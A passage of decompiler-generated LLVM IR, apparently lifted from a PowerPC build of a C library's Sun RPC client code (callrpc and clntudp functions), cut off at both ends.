  br i1 %v3_10022048, label %dec_label_pc_10022078, label %dec_label_pc_10022050

dec_label_pc_10022050:                            ; preds = %entry
  %v1_10022050 = inttoptr i32 %v3_10022044 to i32*
  %v2_10022050 = load i32, i32* %v1_10022050, align 4
  %v3_10022054 = icmp eq i32 %v2_10022050, 0
  br i1 %v3_10022054, label %dec_label_pc_10022070, label %dec_label_pc_10022060

dec_label_pc_10022060:                            ; preds = %dec_label_pc_10022050
  %v1_10022060 = add i32 %v2_10022050, 4
  %v2_10022060 = inttoptr i32 %v1_10022060 to i32*
  %v3_10022060 = load i32, i32* %v2_10022060, align 4
  %v1_10022064 = add i32 %v3_10022060, 16
  %v2_10022064 = inttoptr i32 %v1_10022064 to i32*
  %v3_10022064 = load i32, i32* %v2_10022064, align 4
  call void @__pseudo_call(i32 %v3_10022064)
  %v0_10022070.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10022070

dec_label_pc_10022070:                            ; preds = %dec_label_pc_10022050, %dec_label_pc_10022060
  %v0_10022070 = phi i32 [ %v3_10022044, %dec_label_pc_10022050 ], [ %v0_10022070.pre, %dec_label_pc_10022060 ]
  store i32 %v0_10022070, i32* @r3, align 4
  store i32 268574840, i32* @lr, align 4
  %v0_10022074 = call i32 @free()
  br label %dec_label_pc_10022078

dec_label_pc_10022078:                            ; preds = %entry, %dec_label_pc_10022070
  %v0_10022088 = phi i32 [ %v0_10022040, %entry ], [ %v0_10022074, %dec_label_pc_10022070 ]
  ret i32 %v0_10022088

; uselistorder directives
  uselistorder label %dec_label_pc_10022078, { 1, 0 }
  uselistorder label %dec_label_pc_10022070, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1145 = alloca i32, align 4
  %stack_var_-1168 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1002208c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1002208c, i32* %stack_var_-128, align 4
  %v0_10022090 = load i32, i32* @lr, align 4
  store i32 %v0_10022090, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r21, align 4
  store i32 %arg2, i32* %r23.global-to-local, align 4
  store i32 %arg3, i32* @r22, align 4
  store i32 %arg4, i32* @r20, align 4
  store i32 %arg5, i32* @r19, align 4
  store i32 %arg6, i32* @r18, align 4
  store i32 %arg7, i32* @r17, align 4
  %v0_100220bc = load i32, i32* @r10, align 4
  store i32 %v0_100220bc, i32* @r16, align 4
  store i32 268574916, i32* @lr, align 4
  %v0_100220c0 = call i32 @__rpc_thread_variables()
  store i32 %v0_100220c0, i32* %r3.global-to-local, align 4
  %v1_100220c4 = add i32 %v0_100220c0, 164
  %v2_100220c4 = inttoptr i32 %v1_100220c4 to i32*
  %v3_100220c4 = load i32, i32* %v2_100220c4, align 4
  store i32 %v3_100220c4, i32* @r30, align 4
  store i32 %v0_100220c0, i32* @r29, align 4
  %v3_100220cc = icmp eq i32 %v3_100220c4, 0
  br i1 %v3_100220cc, label %dec_label_pc_100220d4, label %dec_label_pc_100220f0

dec_label_pc_100220d4:                            ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268574944, i32* @lr, align 4
  %v2_100220dc = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_100220dc, i32* @r30, align 4
  %v3_100220e0 = icmp eq i32 %v2_100220dc, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100220e0, label %dec_label_pc_100222e8, label %dec_label_pc_100220ec

dec_label_pc_100220ec:                            ; preds = %dec_label_pc_100220d4
  %v1_100220ec = load i32, i32* @r29, align 4
  %v2_100220ec = add i32 %v1_100220ec, 164
  %v3_100220ec = inttoptr i32 %v2_100220ec to i32*
  store i32 %v2_100220dc, i32* %v3_100220ec, align 4
  %v0_100220f0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100220f0

dec_label_pc_100220f0:                            ; preds = %entry, %dec_label_pc_100220ec
  %v0_100220f0 = phi i32 [ %v3_100220c4, %entry ], [ %v0_100220f0.pre, %dec_label_pc_100220ec ]
  %v1_100220f0 = add i32 %v0_100220f0, 20
  %v2_100220f0 = inttoptr i32 %v1_100220f0 to i32*
  %v3_100220f0 = load i32, i32* %v2_100220f0, align 4
  store i32 %v3_100220f0, i32* @r29, align 4
  %v3_100220f4 = icmp eq i32 %v3_100220f0, 0
  br i1 %v3_100220f4, label %dec_label_pc_100220fc, label %dec_label_pc_10022114

dec_label_pc_100220fc:                            ; preds = %dec_label_pc_100220f0
  store i32 256, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10022104.1289 to i32), i32* @lr, align 4
  %v0_10022100 = call i32 @malloc()
  %v1_10022100 = inttoptr i32 %v0_10022100 to i8*
  store i32 %v0_10022100, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10022108 = load i32, i32* @r30, align 4
  %v3_10022108 = add i32 %v2_10022108, 20
  %v4_10022108 = inttoptr i32 %v3_10022108 to i32*
  store i32 %v0_10022100, i32* %v4_10022108, align 4
  %v0_1002210c = load i32, i32* @r29, align 4
  %v1_1002210c = trunc i32 %v0_1002210c to i8
  store i8 %v1_1002210c, i8* %v1_10022100, align 1
  %v0_10022110 = load i32, i32* %r0.global-to-local, align 4
  %v1_10022110 = load i32, i32* @r30, align 4
  %v2_10022110 = add i32 %v1_10022110, 4
  %v3_10022110 = inttoptr i32 %v2_10022110 to i32*
  store i32 %v0_10022110, i32* %v3_10022110, align 4
  %v0_10022114.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10022114

dec_label_pc_10022114:                            ; preds = %dec_label_pc_100220f0, %dec_label_pc_100220fc
  %v0_10022138 = phi i32 [ %v0_100220f0, %dec_label_pc_100220f0 ], [ %v0_10022114.pre, %dec_label_pc_100220fc ]
  %v1_10022114 = add i32 %v0_10022138, 16
  %v2_10022114 = inttoptr i32 %v1_10022114 to i32*
  %v3_10022114 = load i32, i32* %v2_10022114, align 4
  store i32 %v3_10022114, i32* %r0.global-to-local, align 4
  %v3_10022118 = icmp eq i32 %v3_10022114, 0
  br i1 %v3_10022118, label %dec_label_pc_1002214c, label %dec_label_pc_10022120

dec_label_pc_10022120:                            ; preds = %dec_label_pc_10022114
  %v1_10022120 = add i32 %v0_10022138, 8
  %v2_10022120 = inttoptr i32 %v1_10022120 to i32*
  %v3_10022120 = load i32, i32* %v2_10022120, align 4
  store i32 %v3_10022120, i32* %r0.global-to-local, align 4
  %v1_10022124 = load i32, i32* %r23.global-to-local, align 4
  %v4_10022124 = icmp eq i32 %v3_10022120, %v1_10022124
  br i1 %v4_10022124, label %dec_label_pc_1002212c, label %dec_label_pc_1002214c

dec_label_pc_1002212c:                            ; preds = %dec_label_pc_10022120
  %v1_1002212c = add i32 %v0_10022138, 12
  %v2_1002212c = inttoptr i32 %v1_1002212c to i32*
  %v3_1002212c = load i32, i32* %v2_1002212c, align 4
  store i32 %v3_1002212c, i32* %r0.global-to-local, align 4
  %v1_10022130 = load i32, i32* @r22, align 4
  %v4_10022130 = icmp eq i32 %v3_1002212c, %v1_10022130
  br i1 %v4_10022130, label %dec_label_pc_10022138, label %dec_label_pc_1002214c

dec_label_pc_10022138:                            ; preds = %dec_label_pc_1002212c
  %v1_10022138 = add i32 %v0_10022138, 20
  %v2_10022138 = inttoptr i32 %v1_10022138 to i32*
  %v3_10022138 = load i32, i32* %v2_10022138, align 4
  store i32 %v3_10022138, i32* %r3.global-to-local, align 4
  %v0_1002213c = load i32, i32* @r21, align 4
  store i32 %v0_1002213c, i32* @r4, align 4
  %v2_10022140 = inttoptr i32 %v3_10022138 to i8*
  %v3_10022140 = call i32 @__GI_strcoll(i8* %v2_10022140, i32 %v0_1002213c)
  store i32 %v3_10022140, i32* %r3.global-to-local, align 4
  %v3_10022144 = icmp eq i32 %v3_10022140, 0
  br i1 %v3_10022144, label %dec_label_pc_10022138.dec_label_pc_10022290_crit_edge, label %dec_label_pc_10022138.dec_label_pc_1002214c_crit_edge

dec_label_pc_10022138.dec_label_pc_10022290_crit_edge: ; preds = %dec_label_pc_10022138
  br label %dec_label_pc_10022290

dec_label_pc_10022138.dec_label_pc_1002214c_crit_edge: ; preds = %dec_label_pc_10022138
  %v0_1002214c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1002214c

dec_label_pc_1002214c:                            ; preds = %dec_label_pc_10022138.dec_label_pc_1002214c_crit_edge, %dec_label_pc_1002212c, %dec_label_pc_10022120, %dec_label_pc_10022114
  %v0_1002214c = phi i32 [ %v0_1002214c.pre, %dec_label_pc_10022138.dec_label_pc_1002214c_crit_edge ], [ %v0_10022138, %dec_label_pc_1002212c ], [ %v0_10022138, %dec_label_pc_10022120 ], [ %v0_10022138, %dec_label_pc_10022114 ]
  %v1_1002214c = add i32 %v0_1002214c, 4
  %v2_1002214c = inttoptr i32 %v1_1002214c to i32*
  %v3_1002214c = load i32, i32* %v2_1002214c, align 4
  store i32 %v3_1002214c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_10022154 = add i32 %v0_1002214c, 16
  %v3_10022154 = inttoptr i32 %v2_10022154 to i32*
  store i32 0, i32* %v3_10022154, align 4
  %v3_10022158 = icmp eq i32 %v3_1002214c, -1
  br i1 %v3_10022158, label %dec_label_pc_1002216c, label %dec_label_pc_10022160

dec_label_pc_10022160:                            ; preds = %dec_label_pc_1002214c
  store i32 ptrtoint (i32* @global_var_10022164.1290 to i32), i32* @lr, align 4
  %v1_10022160 = call i32 @__libc_close(i32 %v3_1002214c)
  store i32 %v1_10022160, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10022168 = load i32, i32* @r30, align 4
  %v2_10022168 = add i32 %v1_10022168, 4
  %v3_10022168 = inttoptr i32 %v2_10022168 to i32*
  store i32 -1, i32* %v3_10022168, align 4
  br label %dec_label_pc_1002216c

dec_label_pc_1002216c:                            ; preds = %dec_label_pc_1002214c, %dec_label_pc_10022160
  %v0_1002216c = load i32, i32* @r30, align 4
  %v1_1002216c = inttoptr i32 %v0_1002216c to i32*
  %v2_1002216c = load i32, i32* %v1_1002216c, align 4
  store i32 %v2_1002216c, i32* %r3.global-to-local, align 4
  %v3_10022170 = icmp eq i32 %v2_1002216c, 0
  br i1 %v3_10022170, label %dec_label_pc_1002218c, label %dec_label_pc_10022178

dec_label_pc_10022178:                            ; preds = %dec_label_pc_1002216c
  %v1_10022178 = add i32 %v2_1002216c, 4
  %v2_10022178 = inttoptr i32 %v1_10022178 to i32*
  %v3_10022178 = load i32, i32* %v2_10022178, align 4
  %v1_1002217c = add i32 %v3_10022178, 16
  %v2_1002217c = inttoptr i32 %v1_1002217c to i32*
  %v3_1002217c = load i32, i32* %v2_1002217c, align 4
  call void @__pseudo_call(i32 %v3_1002217c)
  %v0_10022188 = load i32, i32* %r29.global-to-local, align 4
  %v1_10022188 = load i32, i32* @r30, align 4
  %v2_10022188 = inttoptr i32 %v1_10022188 to i32*
  store i32 %v0_10022188, i32* %v2_10022188, align 4
  br label %dec_label_pc_1002218c

dec_label_pc_1002218c:                            ; preds = %dec_label_pc_1002216c, %dec_label_pc_10022178
  %v2_1002218c = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1002218c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r29, align 4
  store i32 %v2_1002218c, i32* %stack_var_-1168, align 4
  %v2_100221cc = ptrtoint i32* %stack_var_-1145 to i32
  %v2_100221dc = ptrtoint i32* %stack_var_-120 to i32
  %v2_100221e0 = ptrtoint i32* %stack_var_-116 to i32
  br label %dec_label_pc_100221cc

dec_label_pc_1002219c:                            ; preds = %dec_label_pc_100221cc, %dec_label_pc_100221f8
  %v3_1002219c = load i32, i32* %stack_var_-116, align 4
  store i32 %v3_1002219c, i32* %r0.global-to-local, align 4
  %v3_100221a0 = icmp eq i32 %v3_1002219c, -1
  br i1 %v3_100221a0, label %dec_label_pc_100221a8, label %dec_label_pc_100222e4

dec_label_pc_100221a8:                            ; preds = %dec_label_pc_1002219c
  %v0_100221a8 = call i32 @__errno_location()
  store i32 %v0_100221a8, i32* %r3.global-to-local, align 4
  %v0_100221ac = load i32, i32* @r29, align 4
  %v1_100221ac = add i32 %v0_100221ac, 30
  store i32 %v1_100221ac, i32* %r0.global-to-local, align 4
  %v1_100221b0 = inttoptr i32 %v0_100221a8 to i32*
  %v2_100221b0 = load i32, i32* %v1_100221b0, align 4
  %v1_100221b4 = call i32 @__asm_rlwinm(i32 %v1_100221ac, i32 0, i32 0, i32 27)
  store i32 %v1_100221b4, i32* %r0.global-to-local, align 4
  %v3_100221bc = icmp eq i32 %v2_100221b0, 34
  br i1 %v3_100221bc, label %dec_label_pc_100221c4, label %dec_label_pc_100222e4

dec_label_pc_100221c4:                            ; preds = %dec_label_pc_100221a8
  %v2_100221c4 = load i32, i32* %stack_var_-1168, align 4
  store i32 %v2_100221c4, i32* %r0.global-to-local, align 4
  %v1_100221c8 = load i32, i32* @r1, align 4
  %v3_100221c8 = sub i32 %v1_100221c8, %v1_100221b4
  %v4_100221c8 = inttoptr i32 %v3_100221c8 to i32*
  store i32 %v2_100221c4, i32* %v4_100221c8, align 4
  br label %dec_label_pc_100221cc

dec_label_pc_100221cc:                            ; preds = %dec_label_pc_1002218c, %dec_label_pc_100221c4
  store i32 %v2_100221cc, i32* %r0.global-to-local, align 4
  %v1_100221d4 = call i32 @__asm_rlwinm(i32 %v2_100221cc, i32 0, i32 0, i32 27)
  %v0_100221e4 = load i32, i32* @r21, align 4
  store i32 %v0_100221e4, i32* %r3.global-to-local, align 4
  %v0_100221e8 = load i32, i32* @r29, align 4
  %v1_100221e8 = mul i32 %v0_100221e8, 2
  store i32 %v1_100221e8, i32* %r29.global-to-local, align 4
  store i32 268575216, i32* @lr, align 4
  %v7_100221ec = call i32 @gethostbyname_r(i32 %v0_100221e4, i32* nonnull %stack_var_-96, i32 %v1_100221d4, i32 %v2_100221dc, i32 %v2_100221e0, i32 %v2_100221e0)
  store i32 %v7_100221ec, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v7_100221ec, 65536
  %sext.off = or i32 %sext, 65535
  %tmp = icmp ult i32 %sext.off, 131071
  br i1 %tmp, label %dec_label_pc_100221f8, label %dec_label_pc_1002219c

dec_label_pc_100221f8:                            ; preds = %dec_label_pc_100221cc
  %v3_100221f8 = load i32, i32* %stack_var_-120, align 4
  %v3_100221fc = icmp eq i32 %v3_100221f8, 0
  br i1 %v3_100221fc, label %dec_label_pc_1002219c, label %dec_label_pc_10022204

dec_label_pc_10022204:                            ; preds = %dec_label_pc_100221f8
  %v1_10022204 = add i32 %v3_100221f8, 16
  %v2_10022204 = inttoptr i32 %v1_10022204 to i32*
  %v3_10022204 = load i32, i32* %v2_10022204, align 4
  %v2_10022208 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10022208, i32* @r3, align 4
  %v1_1002220c = add i32 %v3_100221f8, 12
  %v2_1002220c = inttoptr i32 %v1_1002220c to i32*
  %v3_1002220c = load i32, i32* %v2_1002220c, align 4
  store i32 %v3_1002220c, i32* @r5, align 4
  %v1_10022214 = inttoptr i32 %v3_10022204 to i32*
  %v2_10022214 = load i32, i32* %v1_10022214, align 4
  store i32 %v2_10022214, i32* @r4, align 4
  store i32 5, i32* %r27.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10022220.1291 to i32), i32* @lr, align 4
  %v0_1002221c = call i32 @memcpy()
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_10022224 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_10022224, i32* %r3.global-to-local, align 4
  %v0_10022228 = load i32, i32* @r23, align 4
  %v0_1002222c = load i32, i32* @r22, align 4
  %v2_10022230 = ptrtoint i32* %stack_var_-72 to i32
  %v0_10022234 = load i32, i32* @r30, align 4
  %v1_10022234 = add i32 %v0_10022234, 4
  store i32 %v1_10022234, i32* @r7, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v0_10022240 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10022240, i32* %stack_var_-72, align 4
  store i32 268575308, i32* @lr, align 4
  %v6_10022248 = call i32 @__GI_clntudp_create(i32* nonnull %stack_var_-112, i32 %v0_10022228, i32 %v0_1002222c, i32 %v2_10022230, i32 %v1_10022234)
  store i32 %v6_10022248, i32* %r3.global-to-local, align 4
  %v3_1002224c = icmp eq i32 %v6_10022248, 0
  %v1_10022250 = load i32, i32* @r30, align 4
  %v2_10022250 = inttoptr i32 %v1_10022250 to i32*
  store i32 %v6_10022248, i32* %v2_10022250, align 4
  br i1 %v3_1002224c, label %dec_label_pc_10022258, label %dec_label_pc_10022264

dec_label_pc_10022258:                            ; preds = %dec_label_pc_10022204
  store i32 268575324, i32* @lr, align 4
  %v0_10022258 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_10022258, i32* %r3.global-to-local, align 4
  %v1_1002225c = inttoptr i32 %v0_10022258 to i32*
  %v2_1002225c = load i32, i32* %v1_1002225c, align 4
  store i32 %v2_1002225c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100222e8

dec_label_pc_10022264:                            ; preds = %dec_label_pc_10022204
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10022268 = load i32, i32* @r23, align 4
  %v1_10022268 = load i32, i32* @r30, align 4
  %v2_10022268 = add i32 %v1_10022268, 8
  %v3_10022268 = inttoptr i32 %v2_10022268 to i32*
  store i32 %v0_10022268, i32* %v3_10022268, align 4
  %v0_1002226c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002226c = load i32, i32* @r30, align 4
  %v2_1002226c = add i32 %v1_1002226c, 16
  %v3_1002226c = inttoptr i32 %v2_1002226c to i32*
  store i32 %v0_1002226c, i32* %v3_1002226c, align 4
  %v0_10022270 = load i32, i32* @r21, align 4
  store i32 %v0_10022270, i32* @r4, align 4
  %v0_10022274 = load i32, i32* @r22, align 4
  %v1_10022274 = load i32, i32* @r30, align 4
  %v2_10022274 = add i32 %v1_10022274, 12
  %v3_10022274 = inttoptr i32 %v2_10022274 to i32*
  store i32 %v0_10022274, i32* %v3_10022274, align 4
  %v0_1002227c = load i32, i32* @r30, align 4
  %v1_1002227c = add i32 %v0_1002227c, 20
  %v2_1002227c = inttoptr i32 %v1_1002227c to i32*
  %v3_1002227c = load i32, i32* %v2_1002227c, align 4
  store i32 %v3_1002227c, i32* %r3.global-to-local, align 4
  store i32 268575364, i32* @lr, align 4
  %v3_10022280 = call i32 @strncpy(i32 %v3_1002227c, i32 %v0_10022270, i32 255)
  store i32 %v3_10022280, i32* %r3.global-to-local, align 4
  %v0_10022284 = load i32, i32* @r30, align 4
  %v1_10022284 = add i32 %v0_10022284, 20
  %v2_10022284 = inttoptr i32 %v1_10022284 to i32*
  %v3_10022284 = load i32, i32* %v2_10022284, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1002228c = add i32 %v3_10022284, 255
  %v4_1002228c = inttoptr i32 %v3_1002228c to i8*
  store i8 0, i8* %v4_1002228c, align 1
  br label %dec_label_pc_10022290

dec_label_pc_10022290:                            ; preds = %dec_label_pc_10022138.dec_label_pc_10022290_crit_edge, %dec_label_pc_10022264
  %v0_10022298 = load i32, i32* @r30, align 4
  %v1_10022298 = inttoptr i32 %v0_10022298 to i32*
  %v2_10022298 = load i32, i32* %v1_10022298, align 4
  store i32 25, i32* %stack_var_-72, align 4
  store i32 %v2_10022298, i32* %r3.global-to-local, align 4
  %v1_100222b8 = add i32 %v2_10022298, 4
  %v2_100222b8 = inttoptr i32 %v1_100222b8 to i32*
  %v3_100222b8 = load i32, i32* %v2_100222b8, align 4
  %v1_100222c0 = inttoptr i32 %v3_100222b8 to i32*
  %v2_100222c0 = load i32, i32* %v1_100222c0, align 4
  call void @__pseudo_call(i32 %v2_100222c0)
  %v0_100222d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_100222d0 = icmp eq i32 %v0_100222d0, 0
  br i1 %v3_100222d0, label %dec_label_pc_100222e8, label %dec_label_pc_100222d8

dec_label_pc_100222d8:                            ; preds = %dec_label_pc_10022290
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100222dc = load i32, i32* @r30, align 4
  %v2_100222dc = add i32 %v1_100222dc, 16
  %v3_100222dc = inttoptr i32 %v2_100222dc to i32*
  store i32 0, i32* %v3_100222dc, align 4
  %v0_100222fc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100222e8

dec_label_pc_100222e4:                            ; preds = %dec_label_pc_100221a8, %dec_label_pc_1002219c
  store i32 13, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100222e8

dec_label_pc_100222e8:                            ; preds = %dec_label_pc_10022290, %dec_label_pc_100220d4, %dec_label_pc_100222d8, %dec_label_pc_10022258, %dec_label_pc_100222e4
  %v0_100222fc = phi i32 [ 0, %dec_label_pc_10022290 ], [ 0, %dec_label_pc_100220d4 ], [ %v0_100222fc.pre, %dec_label_pc_100222d8 ], [ %v2_1002225c, %dec_label_pc_10022258 ], [ 13, %dec_label_pc_100222e4 ]
  %v2_100222e8 = load i32, i32* %stack_var_-128, align 4
  %v1_100222ec = add i32 %v2_100222e8, 4
  %v2_100222ec = inttoptr i32 %v1_100222ec to i32*
  %v3_100222ec = load i32, i32* %v2_100222ec, align 4
  store i32 %v3_100222ec, i32* %r0.global-to-local, align 4
  ret i32 %v0_100222fc

; uselistorder directives
  uselistorder i32 %v2_10022298, { 1, 0 }
  uselistorder i32 %v2_100221e0, { 1, 0 }
  uselistorder i32 %v3_1002214c, { 1, 0, 2 }
  uselistorder i32 %v0_1002214c, { 1, 0 }
  uselistorder i32 %v0_10022100, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 13, { 0, 4, 8, 3, 2, 5, 6, 7, 1 }
  uselistorder i32 65535, { 0, 6, 5, 12, 7, 8, 1, 2, 9, 10, 3, 4, 11 }
  uselistorder i32 164, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_100222e8, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_10022290, { 1, 0 }
  uselistorder label %dec_label_pc_100221cc, { 1, 0 }
  uselistorder label %dec_label_pc_1002219c, { 1, 0 }
  uselistorder label %dec_label_pc_1002218c, { 1, 0 }
  uselistorder label %dec_label_pc_1002216c, { 1, 0 }
  uselistorder label %dec_label_pc_10022114, { 1, 0 }
  uselistorder label %dec_label_pc_100220f0, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1002232c = add i32 %arg1, 8
  %v2_1002232c = inttoptr i32 %v1_1002232c to i32*
  %v3_1002232c = load i32, i32* %v2_1002232c, align 4
  store i32 %v3_1002232c, i32* %r3.global-to-local, align 4
  %v2_10022330 = add i32 %v3_1002232c, 56
  %v3_10022330 = inttoptr i32 %v2_10022330 to i32*
  store i32 2, i32* %v3_10022330, align 4
  %v0_10022334 = load i32, i32* %r3.global-to-local, align 4
  %v1_10022334 = add i32 %v0_10022334, 56
  store i32 %v1_10022334, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %arg2)
  ret i32 %v1_10022334

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_10022350 = load i32, i32* @r3, align 4
  ret i32 %v0_10022350
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10022354 = add i32 %arg2, -1
  %v2_1002235c = icmp ugt i32 %v1_10022354, 14
  br i1 %v2_1002235c, label %dec_label_pc_10022384, label %dec_label_pc_10022368

dec_label_pc_10022368:                            ; preds = %entry
  %v1_1002236c = mul i32 %v1_10022354, 4
  %v2_10022374 = add i32 %v1_1002236c, ptrtoint (i32* @global_var_1002f9e8.1292 to i32)
  %v3_10022374 = inttoptr i32 %v2_10022374 to i32*
  %v4_10022374 = load i32, i32* %v3_10022374, align 4
  %v2_10022378 = add i32 %v4_10022374, ptrtoint (i32* @global_var_1002f9e8.1292 to i32)
  call void @__pseudo_branch(i32 %v2_10022378)
  br label %dec_label_pc_10022384

dec_label_pc_10022384:                            ; preds = %entry, %dec_label_pc_10022368
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_10022384, { 1, 0 }
}

define i32 @function_1002238c() local_unnamed_addr {
dec_label_pc_1002238c:
  %v1_100223a0 = load i32, i32* @r10, align 4
  %v2_100223a0 = add i32 %v1_100223a0, 4
  %v3_100223a0 = inttoptr i32 %v2_100223a0 to i32*
  store i32 1, i32* %v3_100223a0, align 4
  ret i32 1
}

define i32 @function_100223a8(i32* %arg1) local_unnamed_addr {
dec_label_pc_100223a8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100223a8 = add i32 %tmp, 4
  %v2_100223a8 = inttoptr i32 %v1_100223a8 to i32*
  %v3_100223a8 = load i32, i32* %v2_100223a8, align 4
  %v2_100223b0 = load i32, i32* %arg1, align 4
  store i32 %v2_100223b0, i32* %r0.global-to-local, align 4
  %v1_100223b4 = load i32, i32* @r10, align 4
  %v2_100223b4 = add i32 %v1_100223b4, 40
  %v3_100223b4 = inttoptr i32 %v2_100223b4 to i32*
  store i32 %v3_100223a8, i32* %v3_100223b4, align 4
  %v0_100223b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100223b8 = load i32, i32* @r10, align 4
  %v2_100223b8 = add i32 %v1_100223b8, 36
  %v3_100223b8 = inttoptr i32 %v2_100223b8 to i32*
  store i32 %v0_100223b8, i32* %v3_100223b8, align 4
  ret i32 1
}

define i32 @function_100223c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100223c0:
  %r9.global-to-local = alloca i32, align 4
  %v0_100223c0 = load i32, i32* @r10, align 4
  %v1_100223c0 = add i32 %v0_100223c0, 40
  %v2_100223c0 = inttoptr i32 %v1_100223c0 to i32*
  %v3_100223c0 = load i32, i32* %v2_100223c0, align 4
  store i32 %v3_100223c0, i32* %r9.global-to-local, align 4
  %v1_100223c4 = add i32 %v0_100223c0, 36
  %v2_100223c4 = inttoptr i32 %v1_100223c4 to i32*
  %v3_100223c4 = load i32, i32* %v2_100223c4, align 4
  %v1_100223f0 = load i32, i32* @r12, align 4
  %v2_100223f0 = inttoptr i32 %v1_100223f0 to i32*
  store i32 %v3_100223c4, i32* %v2_100223f0, align 4
  %v0_100223f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100223f4 = load i32, i32* @r12, align 4
  %v2_100223f4 = add i32 %v1_100223f4, 4
  %v3_100223f4 = inttoptr i32 %v2_100223f4 to i32*
  store i32 %v0_100223f4, i32* %v3_100223f4, align 4
  ret i32 1
}

define i32 @function_100223fc() local_unnamed_addr {
dec_label_pc_100223fc:
  ret i32 1
}

define i32 @function_10022410(i32 %arg1) local_unnamed_addr {
dec_label_pc_10022410:
  %v0_10022410 = load i32, i32* @r10, align 4
  %v1_10022410 = inttoptr i32 %v0_10022410 to i32*
  %v2_10022410 = load i32, i32* %v1_10022410, align 4
  %v1_1002246c = load i32, i32* @r12, align 4
  %v2_1002246c = inttoptr i32 %v1_1002246c to i32*
  store i32 %v2_10022410, i32* %v2_1002246c, align 4
  ret i32 1
}

define i32 @function_10022474(i32* %arg1) local_unnamed_addr {
dec_label_pc_10022474:
  %v0_10022474 = load i32, i32* @r10, align 4
  %v1_10022474 = add i32 %v0_10022474, 88
  %v2_10022474 = inttoptr i32 %v1_10022474 to i32*
  %v3_10022474 = load i32, i32* %v2_10022474, align 4
  %v2_1002247c = load i32, i32* %arg1, align 4
  %v2_10022480 = add i32 %v3_10022474, 12
  %v3_10022480 = inttoptr i32 %v2_10022480 to i32*
  store i32 %v2_1002247c, i32* %v3_10022480, align 4
  ret i32 1
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %v0_10022488 = load i32, i32* @lr, align 4
  store i32 %v0_10022488, i32* %r0.global-to-local, align 4
